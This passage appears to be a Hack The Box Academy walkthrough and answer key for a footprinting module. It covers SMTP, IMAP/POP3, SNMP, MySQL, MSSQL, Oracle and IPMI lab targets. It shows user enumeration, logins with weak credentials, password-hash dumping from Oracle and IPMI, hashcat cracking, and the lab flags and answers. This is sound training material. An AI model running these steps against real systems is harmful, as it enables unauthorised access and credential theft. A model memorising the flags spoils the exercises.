Mode ..................... VRFY
Worker Processes ......... 60
Usernames file ........... ./footprinting-wordlist.txt
Target count ............. 1
Username count ........... 101
Target TCP port .......... 25
Query timeout ............ 20 secs
Target domain ............ 

#### Scan started at Wed Aug  3 06:52:48 2022 ####
10.129.42.195: robin exists
#### Scan completed at Wed Aug  3 06:53:04 2022 ####
1 results.

101 queries in 16 seconds (6.3 queries / sec)
```

Students will find out that the username `robin` exists on the system.

Answer: `robin`

# IMAP / POP3

## Question 1

### "Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer."

Students need to launch an `Nmap` scan with the `-sC` and `-sV` options on the spawned target machine IP address, specifying ports 110, 143, 993, and 995:

Code: shell

```shell
sudo nmap -p110,143,993,995 -sC -sV STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nmap -p110,143,993,995 -sC -sV 10.129.131.238

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 06:58 BST
Nmap scan report for 10.129.131.238
Host is up (0.076s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: CAPA TOP SASL STLS UIDL RESP-CODES AUTH-RESP-CODE PIPELINING
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
143/tcp open  imap     Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_imap-capabilities: more IDLE capabilities post-login listed IMAP4rev1 have OK ENABLE Pre-login LOGINDISABLEDA0001 LOGIN-REFERRALS SASL-IR LITERAL+ ID STARTTLS
993/tcp open  ssl/imap Dovecot imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IDLE more listed post-login IMAP4rev1 have OK AUTH=PLAINA0001 capabilities Pre-login ENABLE SASL-IR LITERAL+ LOGIN-REFERRALS ID
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: CAPA TOP SASL(PLAIN) USER UIDL RESP-CODES AUTH-RESP-CODE PIPELINING
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_ssl-date: TLS randomness does not represent time
```

Students can find out the exact name of the organization from the SSL-certificates, which is `Inlanefreight LTD`.

Answer: `InlaneFreight Ltd`

# IMAP / POP3

## Question 2

### "What is the FQDN that the IMAP and POP3 servers are assigned to?"

Students can either use the same output from the `Nmap` scan launched in the previous question or run a new one:

Code: shell

```shell
sudo nmap -p110,143,993,995 -sC -sV STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nmap -p110,143,993,995 -sC -sV 10.129.131.238

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 06:58 BST
Nmap scan report for 10.129.131.238
Host is up (0.076s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: CAPA TOP SASL STLS UIDL RESP-CODES AUTH-RESP-CODE PIPELINING
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
143/tcp open  imap     Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_imap-capabilities: more IDLE capabilities post-login listed IMAP4rev1 have OK ENABLE Pre-login LOGINDISABLEDA0001 LOGIN-REFERRALS SASL-IR LITERAL+ ID STARTTLS
993/tcp open  ssl/imap Dovecot imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IDLE more listed post-login IMAP4rev1 have OK AUTH=PLAINA0001 capabilities Pre-login ENABLE SASL-IR LITERAL+ LOGIN-REFERRALS ID
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: CAPA TOP SASL(PLAIN) USER UIDL RESP-CODES AUTH-RESP-CODE PIPELINING
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_ssl-date: TLS randomness does not represent time
```

Students can find out the Fully Qualified Domain Name (also known as `Common Name` (CN)) from the SSL-certificates, which is `dev.inlanefreight.htb`.

Answer: `dev.inlanefreight.htb`

# IMAP / POP3

## Question 3

### "Enumerate the IMAP service and submit the flag as the answer. \(Format: HTB{...}\)"

After connecting to IMAP(s) using `openssl` with `s_client`, students will find out the flag at the end of the response:

Code: shell

```shell
openssl s_client -connect STMIP:imaps
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ openssl s_client -connect 10.129.131.238:imaps

CONNECTED(00000003)

<SNIP>

read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}
```

Answer: `HTB{roncfbw7iszerd7shni7jr2343zhrj}`

# IMAP / POP3

## Question 4

### "What is the customized version of the POP3 server?"

Students can use any tool to connect to POP3 to grab its banner, for example, with `telnet`:

Code: shell

```shell
telnet STMIP 110
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ telnet 10.129.131.247 110

Trying 10.129.131.247...
Connected to 10.129.131.247.
Escape character is '^]'.
+OK InFreight POP3 v9.188
```

Answer: `InFreight POP3 v9.188`

# IMAP / POP3

## Question 5

### "What is the admin email address?"

After connecting to IMAP(s) using `openssl` with `s_client`, students first need to authenticate with the `LOGIN` command using the credentials `robin:robin`:

Code: shell

```shell
openssl s_client -connect STMIP:imaps
tag0 LOGIN robin robin
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ openssl s_client -connect 10.129.122.133:imaps

CONNECTED(00000003)

<SNIP>

tag0 LOGIN robin robin
tag0 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
```

Then, students need to list all folders/mailboxes, and select the `DEV.DEPARTMENT.INT` mailbox:

Code: shell

```shell
tag1 LIST "" "*"
tag2 SELECT "DEV.DEPARTMENT.INT"
```

```shell-session
tag1 LIST "" "*"

* LIST (\Noselect \HasChildren) "." DEV
* LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
* LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
* LIST (\HasNoChildren) "." INBOX
tag1 OK List completed (0.004 + 0.000 + 0.003 secs).
tag2 SELECT "DEV.DEPARTMENT.INT"
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636414279] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
tag2 OK [READ-WRITE] Select completed (0.003 + 0.000 + 0.002 secs).
```

At last, students need to fetch the body of email 1 that exists in the mailbox, to find out that the admin email address is the value of the sender:

Code: shell

```shell
tag3 FETCH 1 (BODY[])
```

```shell-session
tag3 FETCH 1 (BODY[])

* 1 FETCH (BODY[] {167}
Subject: Flag
To: Robin <robin@inlanefreight.htb>
From: CTO <devadmin@inlanefreight.htb>
Date: Wed, 03 Nov 2021 16:13:27 +0200

HTB{983uzn8jmfgpd8jmof8c34n7zio}
)
```

Answer: `devadmin@inlanefreight.htb`

# IMAP / POP3

## Question 6

### "Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})"

From the output of the previously fetched email, students will find out the flag at the end of it:

```shell-session
tag3 FETCH 1 (BODY[])

* 1 FETCH (BODY[] {167}
Subject: Flag
To: Robin <robin@inlanefreight.htb>
From: CTO <devadmin@inlanefreight.htb>
Date: Wed, 03 Nov 2021 16:13:27 +0200

HTB{983uzn8jmfgpd8jmof8c34n7zio}
)
```

Answer: `HTB{983uzn8jmfgpd8jmof8c34n7zio}`

# SNMP

## Question 1

### "Enumerate the SNMP service and figure out the email address of the admin. Submit it as the answer."

Students need to use `snmpwalk` on the spawned target machine, and preferably save the output it produces to a text file for easier/better readability and searching operations:

Code: shell

```shell
snmpwalk -v2c -c public STMIP | tee SNMPWalk.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ snmpwalk -v2c -c public 10.129.42.195 | tee SNMPWalk.txt

iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIX02 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (131375) 0:21:53.75
iso.3.6.1.2.1.1.4.0 = STRING: "devadmin <devadmin@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIX02"
iso.3.6.1.2.1.1.6.0 = STRING: "InFreight SNMP v0.91"

<SNIP>
```

Students then can use `grep` to filter for the string `@inlanefreight.htb` on the file that contains the saved output to find the email address of the admin:

Code: shell

```shell
grep "@inlanefreight" SNMPWalk.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ grep "@inlanefreight" SNMPWalk.txt

iso.3.6.1.2.1.1.4.0 = STRING: "devadmin <devadmin@inlanefreight.htb>"
```

Answer: `devadmin@inlanefreight.htb`

# SNMP

## Question 2

### "What is the customized version of the SNMP server?"

Students can either use `grep` to filter out the version of the SNMP server from the saved output in the previous question, or notice that the version is within the first few lines of the output of `snmpwalk`, which is `InFreight SNMP v0.91`:

Code: shell

```shell
snmpwalk -v2c -c public STMIP | tee SNMPWalk.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ snmpwalk -v2c -c public 10.129.42.195 | tee SNMPWalk.txt

iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIX02 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (131375) 0:21:53.75
iso.3.6.1.2.1.1.4.0 = STRING: "devadmin <devadmin@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIX02"
iso.3.6.1.2.1.1.6.0 = STRING: "InFreight SNMP v0.91"

<SNIP>
```

Answer: `InFreight SNMP v0.91`

# SNMP

## Question 3

### "Enumerate the custom script that is running on the system and submit its output as the answer."

Given the file that students have used to save the output of `snmpwalk` in from the first question, students need to utilize `grep` and filter for `HTB` in it, using the `-B` (short version of `--before-context`) and `-m` (short version of `--max-count`) flags to find the `/usr/share/flag.sh` custom script accordingly:

Code: shell

```shell
grep -m 1 -B 8 "HTB" SNMPWalk.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ grep -m 1 -B 8 "HTB" SNMPWalk.txt

iso.3.6.1.2.1.25.1.7.1.2.1.2.4.70.76.65.71  = STRING: "/usr/share/flag.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.4.70.76.65.71  = ""
iso.3.6.1.2.1.25.1.7.1.2.1.4.4.70.76.65.71  = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.4.70.76.65.71  = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.4.70.76.65.71  = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.4.70.76.65.71  = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.4.70.76.65.71 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.4.70.76.65.71 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.4.70.76.65.71  = STRING: "HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}"
```

Answer: `HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}`

# MySQL

## Question 1

### "Enumerate the MySQL server and determine the version of it. (Format: MySQL X.X.XX)"

Students need to use `Nmap` with the `-sV` flag on the spawned target machine, specifying port 3306:

Code: shell

```shell
sudo nmap -p3306 -sV STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nmap -p3306 -sV 10.129.42.195

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 08:43 BST
Nmap scan report for 10.129.42.195
Host is up (0.075s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.27-0ubuntu0.20.04.1
```

The version of the MySQL server is `MySQL 8.0.27`.

Answer: `MySQL 8.0.27`

# MySQL

## Question 2

### "During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?"

Students need to connect to the MySQL server on the spawned target machine using `mysql` with the credentials `robin:robin` (there should not be any space after the `-p` flag and the actual password):

Code: shell

```shell
mysql -u robin -probin -h STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -u robin -probin -h 10.129.42.195

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

After successfully connecting to the MySQL server, students first need to list the available databases using the following query:

Code: sql

```sql
show databases;
```

Code: sql

```sql
MySQL [(none)]> show databases;

+--------------------+
| Database           |
+--------------------+
| customers          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.085 sec)
```

Students then need to select/use the `customers` database, list the table(s) within it, and use the `DESCRIBE` command to view its fields:

Code: sql

```sql
use customers
show tables
describe myTable
```

Code: sql

```sql
MySQL [(none)]> use customers

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [customers]> show tables;
+---------------------+
| Tables_in_customers |
+---------------------+
| myTable             |
+---------------------+
1 row in set (0.078 sec)

MySQL [customers]> describe myTable;
+-----------+--------------------+------+-----+---------+----------------+
| Field     | Type               | Null | Key | Default | Extra          |
+-----------+--------------------+------+-----+---------+----------------+
| id        | mediumint unsigned | NO   | PRI | NULL    | auto_increment |
| name      | varchar(255)       | YES  |     | NULL    |                |
| email     | varchar(255)       | YES  |     | NULL    |                |
| country   | varchar(100)       | YES  |     | NULL    |                |
| postalZip | varchar(20)        | YES  |     | NULL    |                |
| city      | varchar(255)       | YES  |     | NULL    |                |
| address   | varchar(255)       | YES  |     | NULL    |                |
| pan       | varchar(255)       | YES  |     | NULL    |                |
| cvv       | varchar(255)       | YES  |     | NULL    |                |
+-----------+--------------------+------+-----+---------+----------------+
9 rows in set (0.079 sec)
```

Students then need to write a query that retrieves the email address of the customer where his name is `Otto Lang`:

Code: sql

```sql
SELECT email FROM myTable WHERE name = "Otto Lang";
```

Code: sql

```sql
MySQL [customers]> SELECT email FROM myTable WHERE name = "Otto Lang";

+---------------------+
| email               |
+---------------------+
| ultrices@google.htb |
+---------------------+
1 row in set (0.078 sec)
```

Answer: `ultrices@google.htb`

# MSSQL

## Question 1

### "Enumerate the target using the concepts taught in this section. List the hostname of the MSSQL server."

After spawning the target machine, students need to run the scripted `Nmap` scan provided in the module's section on the spawned target machine, specifying port 1433:

Code: shell

```shell
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.231.76

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 09:06 BST
Nmap scan report for 10.129.231.76
Host is up (0.075s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|_  Product_Version: 10.0.17763

Host script results:
| ms-sql-info: 
|   Windows server name: ILF-SQL-01
|   10.129.231.76\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.231.76\pipe\sql\query
|_    Clustered: false
| ms-sql-dac: 
|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)
```

From the output of the scan, students will know that the hostname of the MSSQL server is `ILF-SQL-01`.

Answer: `ILF-SQL-01`

# MSSQL

## Question 2

### "Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server."

After spawning the target machine, students need to connect to it using `impacket-mssqlclient.py` with the credentials `backdoor:Password1`:

Code: shell

```shell
/usr/bin/impacket-mssqlclient backdoor@STMIP -windows-auth
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ /usr/bin/impacket-mssqlclient backdoor@10.129.231.76 -windows-auth

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ILF-SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(ILF-SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```

After successfully connecting to the MSSQL server, students need to list out the available databases using the following query:

Code: sql

```sql
SELECT name from sys.databases
```

Code: sql

```sql
SQL> SELECT name from sys.databases

name  
-------------------------------------------------------------------------------
master
tempdb
model
msdb
Employees
```

The only non-default database present on the server is `Employees`.

Answer: `Employees`

# Oracle TNS

## Question 1

### "Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer."

After spawning the target machine, students first need to download the required packages:

Code: shell

```shell
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1
cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0
python3 setup.py build
sudo python3 setup.py install
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
pip3 install openpyxl
```

```shell-session
┌─[eu-academy-5]─[10.10.14.97]─[htb-ac-8414@htb-ysmlyx7eba]─[~]
└──╼ [★]$ sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1
cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0
python3 setup.py build
sudo python3 setup.py install
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
pip3 install openpyxl

<SNIP>
```

Subsequently, students need to use `odat.py` to enumerate the Oracle database services (providing the option `c` when prompted to continue and then `s` after attaining credentials):

Code: shell

```shell
python3 odat.py all -s STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.91]─[htb-ac-413848@htb-qkf0vmr2o8]─[~/odat]
└──╼ [★]$ python3 odat.py all -s 10.129.19.130  

[+] Checking if target 10.129.19.130:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.19.130:1521 is well configured. Continue...

<SNIP>

[2] (10.129.19.130:1521): Searching valid SIDs
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.19.130:1521 server
[+] 'XE' is a valid SID. Continue...                        ###############################################################  | ETA:  00:00:01 

<SNIP>

The login cis has already been tested at least once. What do you want to do:                                                 | ETA:  00:06:57 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
<SNIP>
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password                                           | ETA:  00:03:43 
[!] Notice: 'outln' account is locked, so skipping this username for password#####                                           | ETA:  00:03:20 
[+] Valid credentials found: scott/tiger. Continue...       #########################################                        | ETA:  00:01:48 
[!] Notice: 'xdb' account is locked, so skipping this username for password#############################################     | ETA:  00:00:21 
100% |#######################################################################################################################| Time: 00:08:56 
[+] Accounts found on 10.129.19.130:1521/sid:XE: 
scott/tiger


[5] (10.129.19.130:1521): Searching valid accounts on the XEXDB Service Name
The login abm has already been tested at least once. What do you want to do:                                                 | ETA:  --:--:-- 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
s
100% |#######################################################################################################################| Time: 00:00:09 
```

Students will proceed to install `sqlplus` with the following commands:

Code: shell

```shell
sudo apt update
sudo apt upgrade parrot-core
sudo apt update
sudo apt install oracle-instantclient-sqlplus
```

```shell-session
┌─[eu-academy-1]─[10.10.15.120]─[htb-ac-60@htb-1boge9s46q-htb-cloud-com]─[~]
└──╼ [★]$ sudo apt update
sudo apt upgrade parrot-core
sudo apt update
sudo apt install oracle-instantclient-sqlplus

Hit:1 [https://deb.parrot.sh/parrot](https://deb.parrot.sh/parrot) lory InRelease
Hit:2 [https://deb.parrot.sh/direct/parrot](https://deb.parrot.sh/direct/parrot) lory-security InRelease
Hit:3 [https://deb.parrot.sh/parrot](https://deb.parrot.sh/parrot) lory-backports InRelease
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
99 packages can be upgraded. Run 'apt list --upgradable' to see them.

<SNIP>

Selecting previously unselected package oracle-instantclient-sqlplus.
(Reading database ... 597500 files and directories currently installed.)
Preparing to unpack .../oracle-instantclient-sqlplus_19.6.0.0.0-0parrot2_amd64.deb ...
Unpacking oracle-instantclient-sqlplus (19.6.0.0.0-0parrot2) ...
Setting up oracle-instantclient-sqlplus (19.6.0.0.0-0parrot2) ...
Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated
```

Subsequently, students need to execute the following command:

Code: shell

```shell
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

```shell-session
┌─[eu-academy-1]─[10.10.15.120]─[htb-ac-60@htb-1boge9s46q-htb-cloud-com]─[~]
└──╼ [★]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Using the found credentials `scott/tiger`, students need to connect to the database on `STMIP` with `sqlplus` as `sysdba`, utilizing the `Oracle Express Edition` (`XE`) `service identifier`:

Code: shell

```shell
sqlplus scott/tiger@STMIP/XE as sysdba
```

```shell-session
┌─[us-academy-2]─[10.10.15.12]─[htb-ac-594497@htb-pe4uhikext]─[~/odat]
└──╼ [★]$ sqlplus scott/tiger@10.129.8.92/XE as sysdba

SQL*Plus: Release 19.0.0.0.0 - Production on Wed Mar 29 19:06:12 2023
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

Connected to:

Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

At last, when retrieving the password hashes from the `sys.user$` table, students will attain the password `E066D214D5421CCC` for the user `DBSNMP`:

Code: sql

```sql
select name, password from sys.user$ where name = 'DBSNMP';
```

Code: sql

```sql
SQL> select name, password from sys.user$ where name = 'DBSNMP';

NAME			       PASSWORD
------------------------------ ------------------------------
DBSNMP			       E066D214D5421CCC
```

Answer: `E066D214D5421CCC`

# IPMI

## Question 1

### "What username is configured for accessing the host via IPMI?"

After spawning the target machine, students need to launch `msfconsole` and use the `ipmi_dumphashes` module under `auxiliary/scanner/ipmi/`, setting `RHOSTS` to `STMIP` and then running the exploit; students will find that the `admin` username is configured for accessing the host via IPMI:

Code: shell

```shell
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS STMIP
run
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.129.131.254
RHOSTS => 10.129.131.254
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.131.254:623 - IPMI - Hash found: admin:93c887ae8200000052f17511d0fd3b9a08350b045e118a2cd0c311777576080bc13a5581d522cdb5a123456789abcdefa123456789abcdef140561646d696e:3541221bac8d7e76f34e45697aed40edfbe87fd8
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Answer: `admin`

# IPMI

## Question 2

### "What is the account's cleartext password?"

Using the hash that was found from the `ipmi_dumphashes` module from `msfconsole` in the previous question, students need to crack it using `Hashcat`, specifying 7300 as the hashmode and `rockyou.txt` as the wordlist; students will find out that the plaintext password is `trinity`:

Code: shell

```shell
hashcat -m 7300 -w 3 -O "93c887ae8200000052f17511d0fd3b9a08350b045e118a2cd0c311777576080bc13a5581d522cdb5a123456789abcdefa123456789abcdef140561646d696e:3541221bac8d7e76f34e45697aed40edfbe87fd8" /usr/share/wordlists/rockyou.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hashcat -m 7300 -w 3 -O "93c887ae8200000052f17511d0fd3b9a08350b045e118a2cd0c311777576080bc13a5581d522cdb5a123456789abcdefa123456789abcdef140561646d696e:3541221bac8d7e76f34e45697aed40edfbe87fd8" /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

93c887ae8200000052f17511d0fd3b9a08350b045e118a2cd0c311777576080bc13a5581d522cdb5a123456789abcdefa123456789abcdef140561646d696e:3541221bac8d7e76f34e45697aed40edfbe87fd8:trinity

<SNIP>
```

Answer: `trinity`

# Footprinting Lab - Easy

## Question 1

### "Enumerate the server carefully and find the flag.txt file. Then, submit the contents of this file as the answer."

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A 10.129.141.200
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ nmap -A 10.129.141.200

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-28 13:36 GMT
Nmap scan report for 10.129.141.200
Host is up (0.046s latency).
Not shown: 996 closed tcp ports (conn-refused)
